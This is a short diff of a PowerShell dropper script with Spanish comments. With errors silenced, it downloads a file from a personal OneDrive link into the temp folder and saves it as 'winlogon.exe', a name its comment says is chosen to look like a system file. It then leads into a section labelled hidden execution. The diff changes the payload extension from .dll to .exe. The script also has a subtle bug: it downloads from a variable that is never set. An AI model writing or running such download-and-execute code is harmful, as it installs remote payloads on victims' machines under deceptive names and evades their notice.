@@ -2,7 +2,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 $url = "https://my.microsoftpersonalcontent.com/personal/515d5688c817c6e0/_layouts/15/download.aspx?UniqueId=ff5a20ff-9881-43d0-b168-b4309c5491b5&Translate=false&tempauth=v1e.eyJzaXRlaWQiOiIzNDQ1ZmFiYy01Y2VmLTQ3YjQtOGNkOS0yNWFiOTBhZWE4ZWYiLCJhdWQiOiIwMDAwMDAwMy0wMDAwLTBmZjEtY2UwMC0wMDAwMDAwMDAwMDAvbXkubWljcm9zb2Z0cGVyc29uYWxjb250ZW50LmNvbUA5MTg4MDQwZC02YzY3LTRjNWItYjExMi0zNmEzMDRiNjZkYWQiLCJleHAiOiIxNzczNzg2NTM2In0.PmLdvM0utlfCCjdGwTjucHmeonXeOduaI4p0ikKfLxu63eDa6zWjtTkr8-toBFphZiTiDxc_abkwVRseuIpiysXE8StXoyd7-5FN1WqSe-jUgFqORHK7blWkULyAWWBZxNFnBAZt9DRdLBJF-48bJloOCdVyw5UWRNxfzFYhV9F1MBxkui9E3NHNr3pl55Em2oU7hLMo9VVh3VBmt0aCskkL2VvHJ7fyeqSnczPgwUgkFSwZ6ag4AwCFyprI-04UR3qw1GeAwrEgBpqrbzanYzczQsdTCLCZFeQQrzEM_RA7ORj2UwN2IES_hLfBPM18vFHRTzhsqTdRxJLL-1IrjQwhm4n15pvQfcLCDzh9PDm1DULsCynYTWghPvdy_cvKkSbSUxZCYmplSUpPu17UE_YMbeh0n2x1nPGRe74ue3JE3Ka7GbLA2o9w26txA04i7lL77YgWExoiDf7Yj37R8EpQIobpwpnezRj_DuT6j-fCHuMTvCksMjCwpTB62q_40sF5EQn4lI9ryDO3-7CcZw.wDf7jRnDDk0xvEDdDR7kUTeMj3tr5y42jrmMSWBo7Ys&ApiVersion=2.0"
-$rutaTemp = "$env:TEMP\winlogon.dll"  # Nombre que parece de sistema
+$rutaTemp = "$env:TEMP\winlogon.exe"  # Nombre que parece de sistema
 (New-Object System.Net.WebClient).DownloadFile($urlEjecutable, $rutaTemp)
 
 # === EJECUCIÓN OCULTA ===
